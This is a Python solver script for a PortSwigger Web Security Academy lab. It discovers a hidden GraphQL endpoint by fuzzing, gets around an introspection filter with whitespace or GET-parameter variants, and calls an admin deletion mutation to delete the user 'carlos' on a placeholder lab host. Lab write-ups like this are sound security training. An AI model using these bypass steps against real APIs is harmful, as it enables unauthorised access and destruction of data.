"""
Lab 3: Finding a hidden GraphQL endpoint
https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint
Difficulty: Practitioner

📝 No visible /graphql link anywhere in the app. Fuzz common suffixes
first; once found, this lab actively BLOCKS introspection via a filter —
bypass it with a whitespace/formatting variant that still parses
correctly but doesn't match the filter's literal string pattern.
"""

from utils import get_session, discover_endpoint, try_introspection, graphql_query, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()

    note("Step 1: fuzz common GraphQL endpoint paths.")
    endpoint = discover_endpoint(s, TARGET)
    if not endpoint:
        log("No endpoint found in the common-path list — try adding more", ok=False)
        note("candidates (check the lab's own hint text, or Burp's site map")
        note("for any request that looks like it's carrying a 'query' field).")
        return

    note("Step 2: attempt introspection — expect it to be blocked initially.")
    schema = try_introspection(s, endpoint)
    if not schema:
        note("Both standard attempts failed. Try a GET-based request with the")
        note("query URL-encoded as a parameter instead of POST — some filters")
        note("only inspect POST bodies:")
        r, data = graphql_query(s, f"{endpoint}?query=query%7B__typename%7D", "")
        log(f"GET-based probe: {data}")

    note("Step 3: once introspection succeeds, look for a")
    note("deleteOrganizationUser-style mutation (or similar admin action)")
    note("and call it directly to delete carlos.")


if __name__ == "__main__":
    run()
